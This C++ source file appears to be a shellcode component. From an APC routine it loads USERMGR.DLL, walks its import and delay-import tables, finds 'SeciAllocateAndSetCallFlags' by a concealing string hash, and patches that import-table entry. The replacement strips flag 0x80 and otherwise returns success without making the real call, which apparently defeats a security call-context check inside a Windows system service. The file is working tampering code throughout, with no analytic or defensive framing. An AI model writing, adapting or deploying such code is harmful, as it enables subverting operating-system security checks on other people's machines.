#include "stdafx.h"

//#define _PRINT_CPP_NAMES_
#include "../ScEntry/address.h"

DWORD HashString(PCSTR lpsz, DWORD hash = 0)
{
	while (char c = *lpsz++) hash = hash * 33 ^ c;
	return hash;
}

EXTERN_C
HRESULT
WINAPI
SeciAllocateAndSetCallFlags(_In_ ULONG dwFlags, _Out_ PBOOL FreeCallContext);

HRESULT
WINAPI
MySeciAllocateAndSetCallFlags(_In_ ULONG dwFlags, _Out_ PBOOL FreeCallContext)
{
	if (dwFlags &= ~0x80)
	{
		return SeciAllocateAndSetCallFlags(dwFlags, FreeCallContext);
	}

	if (FreeCallContext) *FreeCallContext = FALSE;
	return S_OK;
}

#include <C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.41.34120\include\delayimp.h>

void NTAPI OnApc(_In_ ULONG rvaINT, _In_ ULONG rvaIAT, _In_ PVOID hmod)
{
	CPP_FUNCTION;

	if (hmod = LoadLibraryW(_YW(L"USERMGR.DLL")))
	{
		USHORT e[] = { IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT, IMAGE_DIRECTORY_ENTRY_IMPORT };
		ULONG d[] = { sizeof(ImgDelayDescr), sizeof(IMAGE_IMPORT_DESCRIPTOR) };

		ULONG i = _countof(e);
		do
		{
			ULONG s;
			union {
				PIMAGE_IMPORT_DESCRIPTOR piid;
				PCImgDelayDescr pdid;
				PVOID pv;
			};

			if (pv = RtlImageDirectoryEntryToData(hmod, TRUE, e[--i], &s))
			{
				if (s /= d[i])
				{
					do
					{
						if (i)
						{
							rvaINT = piid->OriginalFirstThunk;
							rvaIAT = piid->FirstThunk;
							if (!piid++->Name)
							{
								break;
							}
						}
						else
						{
							if (pdid->grAttrs & dlattrRva)
							{
								rvaINT = pdid->rvaINT;
								rvaIAT = pdid->rvaIAT;
							}
							else
							{
								break;
							}

							if (!pdid++->rvaDLLName)
							{
								break;
							}
						}

						if (rvaINT && rvaIAT)
						{
							IMAGE_THUNK_DATA* pitd = (IMAGE_THUNK_DATA*)RtlOffsetToPointer(hmod, rvaIAT);
							const IMAGE_THUNK_DATA* pcitd = (IMAGE_THUNK_DATA*)RtlOffsetToPointer(hmod, rvaINT);
							while (ULONG_PTR AddressOfData = pcitd++->u1.AddressOfData)
							{
								if (!IMAGE_SNAP_BY_ORDINAL(AddressOfData))
								{
									PIMAGE_IMPORT_BY_NAME piibn = (PIMAGE_IMPORT_BY_NAME)RtlOffsetToPointer(hmod, AddressOfData);
									if (0xE5CCE2B5 == HashString((PCSTR)piibn->Name))
									{
										void** ppv = (void**)&pitd->u1.Function;
										ULONG op;
										if (VirtualProtect(ppv, sizeof(void*), PAGE_READWRITE, &op))
										{
											*ppv = _Y(MySeciAllocateAndSetCallFlags);
											if (PAGE_READWRITE != op) VirtualProtect(ppv, sizeof(void*), op, &op);
										}
										return;
									}
								}
								pitd++;
							}
						}

					} while (--s);
				}
			}

		} while (i);
	}
}